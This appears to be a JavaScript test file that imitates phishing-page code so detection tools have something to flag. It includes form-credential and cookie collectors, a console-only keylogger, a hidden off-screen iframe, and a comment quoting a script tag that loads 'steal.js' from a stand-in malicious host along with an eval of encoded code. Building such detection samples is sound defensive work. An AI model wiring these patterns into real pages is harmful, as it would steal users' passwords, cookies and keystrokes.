/**
 * This is a demonstration file that mimics malicious JavaScript that would be used in 
 * phishing sites. It contains patterns that should trigger detection algorithms.
 * NO ACTUAL HARMFUL CODE IS INCLUDED.
 */

// Fake credential collector (never actually runs)
function collectSensitiveData() {
  // This function would typically collect form data and send it to a malicious server
  const userData = {
    email: document.getElementById('email').value,
    password: document.getElementById('password').value,
    timestamp: new Date().toString(),
    browser: navigator.userAgent,
    cookies: document.cookie
  };
  
  // This is just for demonstration - no data is actually sent
  console.log("DEMO ONLY: In a real phishing attack, data would be sent to a malicious server");
  
  return userData;
}

// Fake cookie stealer (never actually runs)
function extractCookies() {
  return document.cookie;
}

// Fake function to bypass security (never actually runs)
function bypassSecurityChecks() {
  // This would try to bypass browser security
  return "security_bypassed";
}

// Fake keylogger setup (never actually runs)
function setupKeylogger() {
  // This would typically add event listeners to track keypresses
  document.addEventListener('keypress', function(e) {
    // In a real attack, this would send keystrokes to a malicious server
    console.log("DEMO: Keylogger would record: " + e.key);
  });
}

// Create a hidden iframe (common phishing technique)
function createHiddenFrame() {
  const iframe = document.createElement('iframe');
  iframe.style.position = 'absolute';
  iframe.style.left = '-9999px';
  iframe.style.top = '-9999px';
  iframe.width = '1px';
  iframe.height = '1px';
  iframe.src = 'https://legitimate-looking-site.com/login';
  document.body.appendChild(iframe);
}

// Add payload to page for demonstration purposes only
document.addEventListener('DOMContentLoaded', function() {
  // Add script reference to the page (but don't actually run malicious functions)
  const scriptComment = document.createComment(`
    This page would typically load malicious scripts like:
    - document.write(unescape('%3Cscript src="http://malicious-domain.com/steal.js"%3E%3C/script%3E'));
    - eval(base64_decode('base64encodedmaliciouscode'));
  `);
  document.body.appendChild(scriptComment);
});
